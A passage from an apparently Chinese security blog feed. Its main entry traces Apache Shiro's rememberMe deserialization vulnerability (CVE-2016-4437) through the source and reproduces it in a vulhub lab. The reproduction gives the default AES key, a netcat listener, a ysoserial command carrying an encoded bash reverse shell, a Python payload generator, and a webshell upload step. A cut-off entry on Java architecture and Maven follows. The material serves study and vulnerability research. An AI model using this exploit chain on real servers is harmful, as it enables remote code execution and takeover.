alt="image-20221001202501429"></a></p><p>继续跟进 removeFrom, 定位具体执行代码位置为 SimpleCookie.java</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001202758070.png" data-caption="image-20221001202758070"><img src="/../images/shiro/image-20221001202758070.png" alt="image-20221001202758070"></a></p><p>removeFrom 方法定义了一些方法体，并将值返回与 response 头部添加 Set-Cookie：rememberMe&#x3D;deleteMe</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001203541265.png" data-caption="image-20221001203541265"><img src="/../images/shiro/image-20221001203541265.png" alt="image-20221001203541265"></a></p><p>回到 onSuccessfulLogin 方法中，若设置了 rememberMe 则进入 rememberIdentity</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001204041201.png" data-caption="image-20221001204041201"><img src="/../images/shiro/image-20221001204041201.png" alt="image-20221001204041201"></a></p><p>跟进 rememberIdentity 方法，Ctrl + 鼠标左键，代码位置 AbstractRememberMeManager.java ,具体代码如下：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo)</span> &#123;</span><br><span class="line">     <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> getIdentityToRemember(subject, authcInfo);</span><br><span class="line">     rememberIdentity(subject, principals);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns &#123;<span class="doctag">@code</span> info&#125;.&#123;<span class="doctag">@link</span> org.apache.shiro.authc.AuthenticationInfo#getPrincipals() getPrincipals()&#125; and</span></span><br><span class="line"><span class="comment">  * ignores the &#123;<span class="doctag">@link</span> Subject&#125; argument.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> subject the subject for which the principals are being remembered.</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> info    the authentication info resulting from the successful authentication attempt.</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@return</span> the &#123;<span class="doctag">@code</span> PrincipalCollection&#125; to remember.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">protected</span> PrincipalCollection <span class="title function_">getIdentityToRemember</span><span class="params">(Subject subject, AuthenticationInfo info)</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> info.getPrincipals();</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Remembers the specified account principals by first</span></span><br><span class="line"><span class="comment">  * &#123;<span class="doctag">@link</span> #convertPrincipalsToBytes(org.apache.shiro.subject.PrincipalCollection) converting&#125; them to a byte</span></span><br><span class="line"><span class="comment">  * array and then &#123;<span class="doctag">@link</span> #rememberSerializedIdentity(org.apache.shiro.subject.Subject, byte[]) remembers&#125; that</span></span><br><span class="line"><span class="comment">  * byte array.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> subject           the subject for which the principals are being remembered.</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> accountPrincipals the principals to remember for retrieval later.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> &#123;</span><br><span class="line">     <span class="type">byte</span>[] bytes = convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">     rememberSerializedIdentity(subject, bytes);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Converts the given principal collection the byte array that will be persisted to be &#x27;remembered&#x27; later.</span></span><br><span class="line"><span class="comment">  * &lt;p/&gt;</span></span><br><span class="line"><span class="comment">  * This implementation first &#123;<span class="doctag">@link</span> #serialize(org.apache.shiro.subject.PrincipalCollection) serializes&#125; the</span></span><br><span class="line"><span class="comment">  * principals to a byte array and then &#123;<span class="doctag">@link</span> #encrypt(byte[]) encrypts&#125; that byte array.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> principals the &#123;<span class="doctag">@code</span> PrincipalCollection&#125; to convert to a byte array</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@return</span> the representative byte array to be persisted for remember me functionality.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">protected</span> <span class="type">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">     <span class="type">byte</span>[] bytes = serialize(principals);</span><br><span class="line">     <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">         bytes = encrypt(bytes);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> bytes;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div><p>由上代码可知，rememberIdentity 使用了 convertPrincipalsToBytes 对 accountPrincipals（用户名）进行了处理</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001204642446.png" data-caption="image-20221001204642446"><img src="/../images/shiro/image-20221001204642446.png" alt="image-20221001204642446"></a></p><p>进入 convertPrincipalsToBytes 后，使用 serialize 对 principals（用户名）进行处理，如果不为空则进行 encrypt 加密处理</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001204916754.png" data-caption="image-20221001204916754"><img src="/../images/shiro/image-20221001204916754.png" alt="image-20221001204916754"></a></p><p>跟进 serialize 方法，查看去具体实现代码</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001205605497.png" data-caption="image-20221001205605497"><img src="/../images/shiro/image-20221001205605497.png" alt="image-20221001205605497"></a></p><p>对 principals（用户名）利用 writeObject 方法进行序列化（该方法文章开头有说明）</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001205850975.png" data-caption="image-20221001205850975"><img src="/../images/shiro/image-20221001205850975.png" alt="image-20221001205850975"></a></p><p>现在知道了 AbstractRememberMeManager.java 中 convertPrincipalsToBytes 对用户名进行了序列化,同位置下，再查看其 bytes 加密方式，如果 getCipherService() 不为空则对 bytes进行加密</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002105038632.png" data-caption="image-20221002105038632"><img src="/../images/shiro/image-20221002105038632.png" alt="image-20221002105038632"></a></p><p>跟进 getCipherService()</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002105113490.png" data-caption="image-20221002105113490"><img src="/../images/shiro/image-20221002105113490.png" alt="image-20221002105113490"></a></p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002105212735.png" data-caption="image-20221002105212735"><img src="/../images/shiro/image-20221002105212735.png" alt="image-20221002105212735"></a></p><p>查看 cipherService 调用情况，全局搜索  this.cipherService</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002111915882.png" data-caption="image-20221002111915882"><img src="/../images/shiro/image-20221002111915882.png" alt="image-20221002111915882"></a></p><p>返回 convertPrincipalsToBytes 方法中跟进 bytes 中 encrypt 加密，Ctrl + 鼠标左键 进入，这里通过 cipherService.encrypt 传入序列化数据和 getEncryptionCipherKey()</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002110713564.png" data-caption="image-20221002110713564"><img src="/../images/shiro/image-20221002110713564.png" alt="image-20221002110713564"></a></p><p>跟进 getEncryptionCipherKey()，Ctrl + 鼠标左键，返回一个加密 Key</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002111026239.png" data-caption="image-20221002111026239"><img src="/../images/shiro/image-20221002111026239.png" alt="image-20221002111026239"></a></p><p>查看调用，全局搜索 this.encryptionCipherKry</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002111502727.png" data-caption="image-20221002111502727"><img src="/../images/shiro/image-20221002111502727.png" alt="image-20221002111502727"></a></p><p>这一步查看 cipherService 调用的时候，发现 setCipherKey 方法在构造方法里面被调用了。</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002112059260.png" data-caption="image-20221002112059260"><img src="/../images/shiro/image-20221002112059260.png" alt="image-20221002112059260"></a></p><p>查看 DEFAULT_CIPHER_KEY_BYTES , CTRL+鼠标左键进入，默认 Key 值为 kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002112234044.png" data-caption="image-20221002112234044"><img src="/../images/shiro/image-20221002112234044.png" alt="image-20221002112234044"></a></p><p>回到AbstractRememberMeManager.java的rememberIdentity方法中,在convertPrincipalsToBytes对用户名进行序列化后，进入到 rememberSerializedIdentity 方法对 subject、byte 进行处理</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002102940381.png" data-caption="image-20221002102940381"><img src="/../images/shiro/image-20221002102940381.png" alt="image-20221002102940381"></a></p><p>跟进 rememberSerializedIdentity ，具体实现代码位于 CookieRememberMeManager.java</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002103109939.png" data-caption="image-20221002103109939"><img src="/../images/shiro/image-20221002103109939.png" alt="image-20221002103109939"></a></p><p>对 Cookie 进行了 base64 加密处理，保存在 Cookie 中</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002103257797.png" data-caption="image-20221002103257797"><img src="/../images/shiro/image-20221002103257797.png" alt="image-20221002103257797"></a></p><p>至止，加密结束。</p><hr><h4 id="解密分析"><a href="#解密分析" class="headerlink" title="解密分析"></a>解密分析</h4><p>通过搜索分析解密，回溯上一层，直接选中 decrypt 鼠标右键 File Usages，定位代码，回溯上一层代码，代码为右下方 </p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003210457908.png" data-caption="image-20221003210457908"><img src="/../images/shiro/image-20221003210457908.png" alt="image-20221003210457908"></a></p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003210757811.png" data-caption="image-20221003210757811"><img src="/../images/shiro/image-20221003210757811.png" alt="image-20221003210757811"></a></p><p>继续回溯 convertBytesToPrincipals</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003210905788.png" data-caption="image-20221003210905788"><img src="/../images/shiro/image-20221003210905788.png" alt="image-20221003210905788"></a></p><p>全局搜索定位 getRememberedSerializedIdentity 方法具体代码</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003211707942.png" data-caption="image-20221003211707942"><img src="/../images/shiro/image-20221003211707942.png" alt="image-20221003211707942"></a></p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003211532163.png" data-caption="image-20221003211532163"><img src="/../images/shiro/image-20221003211532163.png" alt="image-20221003211532163"></a></p><p>解密后继续调用 convertBytesToPricipals 方法</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003211913642.png" data-caption="image-20221003211913642"><img src="/../images/shiro/image-20221003211913642.png" alt="image-20221003211913642"></a></p><p>继续跟进 convertBytesToPricipals 方法，CTRL + 鼠标左键进入</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003212030943.png" data-caption="image-20221003212030943"><img src="/../images/shiro/image-20221003212030943.png" alt="image-20221003212030943"></a></p><p>继续跟进 decrypt ，解密后得到的结果为序列化字符串的bytes，然后进入 deserialize</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003212136191.png" data-caption="image-20221003212136191"><img src="/../images/shiro/image-20221003212136191.png" alt="image-20221003212136191"></a></p><p>得到序列化数值后在进行反序列化操作</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003212959172.png" data-caption="image-20221003212959172"><img src="/../images/shiro/image-20221003212959172.png" alt="image-20221003212959172"></a></p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003213037441.png" data-caption="image-20221003213037441"><img src="/../images/shiro/image-20221003213037441.png" alt="image-20221003213037441"></a></p><hr><h2 id="五、漏洞复现"><a href="#五、漏洞复现" class="headerlink" title="五、漏洞复现"></a>五、漏洞复现</h2><h3 id="1、确认是否使用-Shiro-框架"><a href="#1、确认是否使用-Shiro-框架" class="headerlink" title="1、确认是否使用 Shiro 框架"></a>1、确认是否使用 Shiro 框架</h3><p>正常访问时</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003214114011.png" data-caption="image-20221003214114011"><img src="/../images/shiro/image-20221003214114011.png" alt="image-20221003214114011"></a></p><p>当我们在 Cookie 处添加 remember&#x3D;111 时，返回包出现 remember&#x3D;deleteMe 则证明网站使用 Shiro 框架</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003214254415.png" data-caption="image-20221003214254415"><img src="/../images/shiro/image-20221003214254415.png" alt="image-20221003214254415"></a></p><h3 id="2、漏洞探测"><a href="#2、漏洞探测" class="headerlink" title="2、漏洞探测"></a>2、<strong>漏洞探测</strong></h3><p>burp 插件探测，发现 key 即处在 key 泄露，可构造攻击</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003214813621.png" data-caption="image-20221003214813621"><img src="/../images/shiro/image-20221003214813621.png" alt="image-20221003214813621"></a></p><h3 id="3、漏洞利用"><a href="#3、漏洞利用" class="headerlink" title="3、漏洞利用"></a><strong>3、漏洞利用</strong></h3><p>图形化利用工具，监测密钥</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003220946760.png" data-caption="image-20221003220946760"><img src="/../images/shiro/image-20221003220946760.png" alt="image-20221003220946760"></a></p><p>爆破利用链</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003221058326.png" data-caption="image-20221003221058326"><img src="/../images/shiro/image-20221003221058326.png" alt="image-20221003221058326"></a></p><p>命令执行</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003221158962.png" data-caption="image-20221003221158962"><img src="/../images/shiro/image-20221003221158962.png" alt="image-20221003221158962"></a></p><p>上传 webshell 自定义路径为当前网站根目录，获取 webshell</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003222145191.png" data-caption="image-20221003222145191"><img src="/../images/shiro/image-20221003222145191.png" alt="image-20221003222145191"></a></p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003222431550.png" data-caption="image-20221003222431550"><img src="/../images/shiro/image-20221003222431550.png" alt="image-20221003222431550"></a></p><h3 id="4、Linux-反弹shell"><a href="#4、Linux-反弹shell" class="headerlink" title="4、Linux 反弹shell"></a>4、Linux 反弹shell</h3><p>环境如下：</p><table><thead><tr><th>环境</th><th>描述</th></tr></thead><tbody><tr><td>靶机 IP</td><td>192.168.114.140</td></tr><tr><td>攻击机 IP</td><td>192.168.114.139</td></tr><tr><td>反弹shell vps</td><td>xxx.xxx.xxx.xxx</td></tr><tr><td>漏洞环境</td><td>vulhub shiro&#x2F;CVE-2016-4437</td></tr><tr><td>生成shiro 反序列化攻击 payload</td><td>expShiro.py</td></tr><tr><td>辅助工具</td><td>ysoserial-all.jar</td></tr></tbody></table><p>下载 vulhub ，进行 shiro 目录利用 docker 拉取 shiro 漏洞环境镜像</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015103652468-16658190654921.png" data-caption="image-20221015103652468"><img src="/../images/shiro/image-20221015103652468-16658190654921.png" alt="image-20221015103652468"></a></p><p>访问 8080 端口</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015103818676.png" data-caption="image-20221015103818676"><img src="/../images/shiro/image-20221015103818676.png" alt="image-20221015103818676"></a></p><p>服务器启监听，等待接收shell</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015143616770.png" data-caption="image-20221015143616770"><img src="/../images/shiro/image-20221015143616770.png" alt="image-20221015143616770"></a></p><p>启用 ysoserial-all.jar 工具中的 JRMP 监听模块，监听 1999 端口并执行反弹 shell 命令</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1999 CommonsCollections5 &#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94LngueC54LzIzMzMgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015143557298.png" data-caption="image-20221015143557298"><img src="/../images/shiro/image-20221015143557298.png" alt="image-20221015143557298"></a></p><p>expShiro.py 生成 payload，脚本如下：</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">command</span>):</span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial-all.jar&#x27;</span>, <span class="string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>命令：python3 expShiro.py x.x.x.x:1999</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015143803339.png" data-caption="image-20221015143803339"><img src="/../images/shiro/image-20221015143803339.png" alt="image-20221015143803339"></a></p><p>将生成的 rememberMe 数据于 burp 放包执行获取反弹 shell</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015144055376-16658217756221.png" data-caption="image-20221015144055376"><img src="/../images/shiro/image-20221015144055376-16658217756221.png" alt="image-20221015144055376"></a></p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015144009953.png" data-caption="image-20221015144009953"><img src="/../images/shiro/image-20221015144009953.png" alt="image-20221015144009953"></a></p><h2 id="六、小结"><a href="#六、小结" class="headerlink" title="六、小结"></a>六、小结</h2><p>本文只作学习记录，文章中出现的环境及工具可在 Github 仓库 Download。</p><h2 id="七、参考文章"><a href="#七、参考文章" class="headerlink" title="七、参考文章"></a>七、参考文章</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.geekby.site/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/`</span><br><span class="line">http://changxia3.com/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/</span><br><span class="line">https://blog.csdn.net/qq_44769520/article/details/123476443</span><br><span class="line">https://cloud.tencent.com/developer/article/1590955</span><br><span class="line">https://www.freebuf.com/vuls/290922.html</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java代码审计 </tag>
            
            <tag> Shiro反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA代码审计(三)-基础知识</title>
      <link href="/2022/10/02/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%B8%89)-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2022/10/02/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%B8%89)-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h3 id="一、Java-三层架构"><a href="#一、Java-三层架构" class="headerlink" title="一、Java 三层架构"></a>一、Java 三层架构</h3><p>Java 项目开发过程中把整个项目分为三层：表现层、数据访问层、业务逻辑层。</p><ul><li>表现层：MVC（Model-ViewControler）模式，采用 <code>JSP/Servlet</code> 技术进行页面效果显示，即用户操作界面，为用户提供交互操作。</li><li>数据访问层： 采用 <code>DAO</code> 模式, <code>DAO</code> 为提供访问关系型数据库系统所需操作的接口，将数据访问和业务逻辑分离对上层提供面向对象的数据访问接口,也就是哪个类对应哪个表，哪个属性对应哪个列，为业务逻辑层提供数据，根据传入的值来操作数据库，增、删、改、查。</li><li>业务逻辑层：采用事务脚本模式，负责关键业务的处理和数据传递，复杂的逻辑判断和涉及到数据库的数据验证均需要在此进行处理，根据用户传入的值返回相关数据或处理相关逻辑。</li></ul><p>SSH 框架</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">业务层——Spring</span><br><span class="line">表现层——Struts</span><br><span class="line">持久层——Hibernate</span><br></pre></td></tr></table></figure></div><p>SSM框架</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">业务层——Spring</span><br><span class="line">表现层——SpringMVC</span><br><span class="line">持久层——MyBatis</span><br></pre></td></tr></table></figure></div><br/><h3 id="二、MVC模式"><a href="#二、MVC模式" class="headerlink" title="二、MVC模式"></a>二、MVC模式</h3><p>MVC，全称是 <code>Model-View-Controller（模型-视图-控制器）</code>，是一种设计的规范，一种架构的模式。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Model 模型：提供数据和行为，即 Dao 和 Service</span><br><span class="line">View 视图： GUI组件，用于数据的展示，及jsp、html等</span><br><span class="line">Controller 控制器：用于流程的控制，接收用户请求，交给业务层处理，再把处理后的模型数据响应给视图，即servlet、controller</span><br></pre></td></tr></table></figure></div><p>工作流程</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Controller层接收到用户的请求，并决定应该用哪个Model来进行处理，然后由 Model 使用逻辑处理用户的请求并返回数据；最后，返回的数据通过View层呈现给用户。</span><br></pre></td></tr></table></figure></div><br/><h3 id="三、Maven"><a href="#三、Maven" class="headerlink" title="三、Maven"></a>三、Maven</h3><p><code>Maven</code> 是一个项目管理工具，它包含了一个对象模型（Project Object Model），是一组标准集合，一个依赖管理系统，用来运行定义在生命周期阶段中插件目标和逻辑。核心功能为：通过 <code>pom.xml</code>文件的配置获取 jar 包不用手动去添加 jar 包。日常项目开发需要应用各种jar包，少则几十、多至上百，若每一个jar都使用人工导入则大大增加工作量。<code>Maven</code>使这一部分工作变得简单，开发者只需通过定义 <code>pom.xml</code>，<code>maven</code> 即可调用仓库的  jar 包直接导入。</p><br/><h3 id="四、pom-xml"><a href="#四、pom-xml" class="headerlink" title="四、pom.xml"></a>四、pom.xml</h3><p>POM 是项目对象模型 (Project Object Model) 的简称,它是 Maven 项目中的文件，使用XML表示，名称叫做pom.xml。该文件用于管理源代码、配置文件、开发者的信息和角色、问题追踪系统、组织信息、项目授权、项目的url、项目的依赖关系等。Maven 项目中必须包含 pom.xml 文件。例子如下：</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--project 标签：根标签，表示对当前工程进行配置、管理--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--modelVersion 标签：从Maven2开始就固定是4.0.0--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--代表当前pom.xml所采用的标签结构--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!--坐标信息--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--在本地仓库中安装后对应的路径：com\seer\maven\seer-heathy-demo\1.0-SNAPSHOT\seer-heathy-demo-1.0-SNAPSHOT.jar--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--groupId 标签：坐标向量之一；代表公司或组织开发的某一个项目--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.seer.maven<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--artifactId 